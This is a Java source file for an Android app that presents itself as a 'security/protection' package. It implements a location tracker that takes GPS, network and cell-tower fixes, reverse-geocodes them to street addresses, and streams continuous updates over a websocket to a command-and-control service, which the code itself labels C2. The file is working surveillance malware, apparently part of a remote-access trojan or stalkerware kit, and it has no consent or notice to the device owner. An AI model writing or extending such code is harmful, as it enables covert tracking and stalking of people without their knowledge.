package com.seguranca.protecao;

import android.content.Context;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Looper;
import android.util.Log;

import com.google.gson.Gson;
import com.seguranca.protecao.CommandControlService;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.io.IOException;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

/**
 * LocationTracker — real GPS + Network location with continuous tracking.
 *
 * Features:
 *  - getCurrentLocation()      GET_LOCATION   (real GPS fix, not {})
 *  - getLastKnownLocation()    GET_LAST_LOCATION
 *  - startTracking()           START_LOCATION_TRACKING
 *  - stopTracking()            STOP_LOCATION_TRACKING
 *  - reverseGeocode()          REVERSE_GEOCODE
 *  - getCellTowerInfo()        GET_CELL_INFO  (backup when no GPS)
 */
public class LocationTracker {

    private static final String TAG = "LocationTracker";

    private final Context ctx;
    private LocationManager locationManager;
    private volatile boolean trackingActive = false;
    private android.location.LocationListener trackingListener;
    private CommandControlService c2;

    public interface LocationCallback {
        void onLocation(String jsonResult);
    }

    public LocationTracker(Context ctx) {
        this.ctx = ctx;
        try {
            locationManager = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        } catch (Exception e) {
            Log.e(TAG, "LocationManager init: " + e.getMessage());
        }
    }

    // ─── GET CURRENT LOCATION ────────────────────────────────────────────────

    /**
     * Tries GPS, then Network, then Last Known.
     * Blocks up to 10 seconds for a fresh fix, falls back to last known.
     */
    public String getCurrentLocation() {
        if (locationManager == null) return buildError("LocationManager unavailable");

        final CountDownLatch latch = new CountDownLatch(1);
        final Location[] result = {null};

        // Try GPS first (best accuracy)
        try {
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestSingleUpdate(
                    LocationManager.GPS_PROVIDER,
                    new LocationListener() {
                        @Override public void onLocationChanged(Location location) {
                            if (result[0] == null || location.getAccuracy() < result[0].getAccuracy()) {
                                result[0] = location;
                            }
                            latch.countDown();
                        }
                        @Override public void onStatusChanged(String p, int s, Bundle e) {}
                        @Override public void onProviderEnabled(String p) {}
                        @Override public void onProviderDisabled(String p) { latch.countDown(); }
                    },
                    Looper.getMainLooper()
                );
            }
        } catch (SecurityException se) {
            Log.w(TAG, "GPS permission: " + se.getMessage());
        }

        // Also request Network location simultaneously
        try {
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestSingleUpdate(
                    LocationManager.NETWORK_PROVIDER,
                    new LocationListener() {
                        @Override public void onLocationChanged(Location location) {
                            if (result[0] == null) {
                                result[0] = location;
                                latch.countDown(); // Network can satisfy the latch too
                            }
                        }
                        @Override public void onStatusChanged(String p, int s, Bundle e) {}
                        @Override public void onProviderEnabled(String p) {}
                        @Override public void onProviderDisabled(String p) {}
                    },
                    Looper.getMainLooper()
                );
            }
        } catch (SecurityException se) {
            Log.w(TAG, "Network location permission: " + se.getMessage());
        }

        // Wait up to 10s for a fresh fix
        try {
            latch.await(10, TimeUnit.SECONDS);
        } catch (InterruptedException ignored) {}

        // If no fix from live request, fall back to last known
        if (result[0] == null) {
            result[0] = getLastKnown();
        }

        if (result[0] == null) {
            return buildError("No location available (check permissions)");
        }

        return buildLocationJson(result[0]);
    }

    // ─── GET LAST KNOWN LOCATION ─────────────────────────────────────────────

    public String getLastKnownLocationJson() {
        Location loc = getLastKnown();
        if (loc == null) return buildError("No last known location");
        return buildLocationJson(loc);
    }

    private Location getLastKnown() {
        if (locationManager == null) return null;
        Location best = null;
        String[] providers = {
            LocationManager.GPS_PROVIDER,
            LocationManager.NETWORK_PROVIDER,
            LocationManager.PASSIVE_PROVIDER
        };
        for (String provider : providers) {
            try {
                Location loc = locationManager.getLastKnownLocation(provider);
                if (loc != null) {
                    if (best == null || loc.getAccuracy() < best.getAccuracy()) {
                        best = loc;
                    }
                }
            } catch (SecurityException ignored) {
            } catch (Exception ignored) {}
        }
        return best;
    }

    // ─── START TRACKING ──────────────────────────────────────────────────────

    /**
     * Starts continuous location tracking. Sends each update to C2 via LOCATION_UPDATE.
     * @param intervalMs  minimum time between updates (ms)
     * @param minDistance minimum distance in meters before an update
     */
    public String startTracking(long intervalMs, float minDistance) {
        if (trackingActive) return "OK: already tracking";
        if (locationManager == null) return buildError("LocationManager unavailable");

        trackingListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                sendLocationUpdate(buildLocationJson(location));
            }
            @Override public void onStatusChanged(String p, int s, Bundle e) {}
            @Override public void onProviderEnabled(String p) {}
            @Override public void onProviderDisabled(String p) {}
        };

        boolean registered = false;
        try {
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                intervalMs, minDistance, trackingListener, Looper.getMainLooper()
            );
            registered = true;
        } catch (SecurityException | IllegalArgumentException se) {
            Log.w(TAG, "GPS tracking: " + se.getMessage());
        }
        try {
            locationManager.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER,
                intervalMs, minDistance, trackingListener, Looper.getMainLooper()
            );
            registered = true;
        } catch (SecurityException | IllegalArgumentException se) {
            Log.w(TAG, "Network tracking: " + se.getMessage());
        }

        if (registered) {
            trackingActive = true;
            return "OK: location tracking started (interval=" + intervalMs + "ms, minDist=" + minDistance + "m)";
        }
        return buildError("Could not register any location provider");
    }

    private void sendLocationUpdate(String json) {
        try {
            CommandControlService svc = CommandControlService.sInstance;
            if (svc != null && svc.isConnected && svc.webSocket != null) {
                JsonObject msg = new JsonObject();
                msg.addProperty("type", "LOCATION_UPDATE");
                msg.addProperty("data", json);
                svc.webSocket.send(new Gson().toJson(msg));
            }
        } catch (Exception e) {
            Log.e(TAG, "sendLocationUpdate: " + e.getMessage());
        }
    }

    // ─── STOP TRACKING ───────────────────────────────────────────────────────

    public String stopTracking() {
        if (!trackingActive || trackingListener == null) return "OK: not tracking";
        try {
            locationManager.removeUpdates(trackingListener);
        } catch (Exception e) {
            Log.w(TAG, "stopTracking: " + e.getMessage());
        }
        trackingActive = false;
        trackingListener = null;
        return "OK: location tracking stopped";
    }

    // ─── REVERSE GEOCODE ─────────────────────────────────────────────────────

    public String reverseGeocode(double lat, double lon) {
        try {
            if (!Geocoder.isPresent()) return buildError("Geocoder not present on device");
            Geocoder geocoder = new Geocoder(ctx, Locale.getDefault());
            List<Address> addresses = geocoder.getFromLocation(lat, lon, 1);
            if (addresses == null || addresses.isEmpty()) return buildError("No address found");
            Address addr = addresses.get(0);
            JsonObject obj = new JsonObject();
            obj.addProperty("formatted_address", addr.getAddressLine(0));
            obj.addProperty("street",       nullSafe(addr.getThoroughfare()));
            obj.addProperty("city",         nullSafe(addr.getLocality()));
            obj.addProperty("state",        nullSafe(addr.getAdminArea()));
            obj.addProperty("country",      nullSafe(addr.getCountryName()));
            obj.addProperty("country_code", nullSafe(addr.getCountryCode()));
            obj.addProperty("postal_code",  nullSafe(addr.getPostalCode()));
            return obj.toString();
        } catch (IOException e) {
            return buildError("Geocoder IO error: " + e.getMessage());
        } catch (Exception e) {
            return buildError("reverseGeocode: " + e.getMessage());
        }
    }

    // ─── CELL TOWER INFO ─────────────────────────────────────────────────────

    /**
     * Gets rough cell tower location (works without GPS permission in many cases).
     */
    public String getCellTowerInfo() {
        JsonObject obj = new JsonObject();
        try {
            android.telephony.TelephonyManager tm =
                (android.telephony.TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                obj.addProperty("operator", nullSafe(tm.getNetworkOperatorName()));
                obj.addProperty("mcc_mnc",  nullSafe(tm.getNetworkOperator()));
                obj.addProperty("country",  nullSafe(tm.getNetworkCountryIso()));
                int state = tm.getCallState();
                obj.addProperty("call_state", state);
            }

            // Cell info list (API 17+)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR1 && tm != null) {
                try {
                    List<android.telephony.CellInfo> cells = tm.getAllCellInfo();
                    if (cells != null) {
                        JsonArray cellArr = new JsonArray();
                        for (android.telephony.CellInfo cell : cells) {
                            JsonObject c = new JsonObject();
                            c.addProperty("registered", cell.isRegistered());
                            c.addProperty("type", cell.getClass().getSimpleName());
                            cellArr.add(c);
                        }
                        obj.add("cells", cellArr);
                    }
                } catch (SecurityException ignored) {}
            }
        } catch (Exception e) {
            obj.addProperty("error", e.getMessage());
        }
        return obj.toString();
    }

    // ─── HELPERS ─────────────────────────────────────────────────────────────

    private String buildLocationJson(Location loc) {
        JsonObject obj = new JsonObject();
        obj.addProperty("latitude",  loc.getLatitude());
        obj.addProperty("longitude", loc.getLongitude());
        obj.addProperty("accuracy",  loc.getAccuracy());
        obj.addProperty("altitude",  loc.getAltitude());
        obj.addProperty("speed",     loc.getSpeed());
        obj.addProperty("bearing",   loc.getBearing());
        obj.addProperty("provider",  nullSafe(loc.getProvider()));
        obj.addProperty("timestamp", loc.getTime());
        obj.addProperty("maps_link", "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());

        // Auto reverse-geocode
        try {
            String geo = reverseGeocode(loc.getLatitude(), loc.getLongitude());
            obj.addProperty("address", geo);
        } catch (Exception ignored) {}

        return obj.toString();
    }

    private String buildError(String msg) {
        JsonObject obj = new JsonObject();
        obj.addProperty("error", msg);
        return obj.toString();
    }

    private String nullSafe(String s) { return s != null ? s : ""; }
}
